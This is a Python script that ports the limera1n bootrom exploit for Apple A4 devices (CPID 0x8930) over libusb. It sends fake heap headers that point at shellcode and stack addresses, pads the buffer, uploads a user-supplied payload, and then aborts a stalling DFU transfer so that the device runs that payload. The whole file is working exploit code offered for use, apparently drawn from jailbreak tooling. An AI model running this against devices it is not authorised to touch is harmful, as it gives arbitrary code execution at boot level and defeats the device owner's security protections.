#!/usr/bin/env python3
"""limera1n bootrom exploit for A4 (CPID 0x8930) over libusb.

Port of syringe/exploits/limera1n/limera1n.c.

The exploit depends on aborting a DFU transfer at a precise moment. The
original macOS code submits the request asynchronously and aborts it; the
Linux port used a 10 ms timeout on a synchronous call. Over USB/IP that
synchronous call can block indefinitely, so this version issues the stalling
transfer from a worker thread and fires the aborting zero-length DNLOAD from
the main thread, which reproduces the intended race.

Usage: limera1n.py <payload-file>
"""
import struct
import sys
import threading
import time

import usb.core
from usb.core import USBError

VID, PID = 0x05AC, 0x1227

MAX_SIZE = 0x2C000            # A4 (0x24000 on S5L8920)
STACK_ADDRESS = 0x8403BF9C    # A4
SHELLCODE_ADDRESS = 0x8402B001
CHUNK = 0x800


def log(*args):
    print(*args, flush=True)


def main(payload_path):
    payload = open(payload_path, "rb").read()
    if len(payload) > CHUNK:
        sys.exit("payload too large: %d" % len(payload))

    dev = usb.core.find(idVendor=VID, idProduct=PID)
    if dev is None:
        sys.exit("no 05ac:1227 DFU device")
    try:
        dev.set_configuration()
    except Exception as exc:
        log("set_configuration:", exc)

    def out(req, data, timeout=1000):
        try:
            return dev.ctrl_transfer(0x21, req, 0, 0, data, timeout)
        except USBError as exc:
            log("  transfer (ignored):", exc)
            return None

    log("resetting DFU counters")
    out(4, None)

    # Spray 0x40-byte fake heap headers: chunk size, prev-size, shellcode, stack.
    buf = bytearray(b"\xCC" * CHUNK)
    for off in range(0, CHUNK, 0x40):
        struct.pack_into("<IIII", buf, off, 0x405, 0x101, SHELLCODE_ADDRESS, STACK_ADDRESS)
    log("sending heap headers")
    out(1, bytes(buf))

    log("sending filler")
    filler = b"\xCC" * CHUNK
    for _ in range(0, MAX_SIZE - (CHUNK * 3), CHUNK):
        out(1, filler)

    log("sending shellcode")
    out(1, payload.ljust(CHUNK, b"\x00"))

    log("issuing stalling transfers (async; expected to never return)")
    threading.Thread(
        target=lambda: out(1, b"\xBB" * CHUNK, timeout=10), daemon=True
    ).start()
    threading.Thread(
        target=lambda: dev.ctrl_transfer(0xA1, 1, 0, 0, CHUNK, 1000), daemon=True
    ).start()

    time.sleep(0.05)

    log("triggering abort")
    out(2, None)

    time.sleep(0.5)
    log("exploit sent — device should re-enumerate in pwned DFU")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("usage: limera1n.py <payload>")
    main(sys.argv[1])
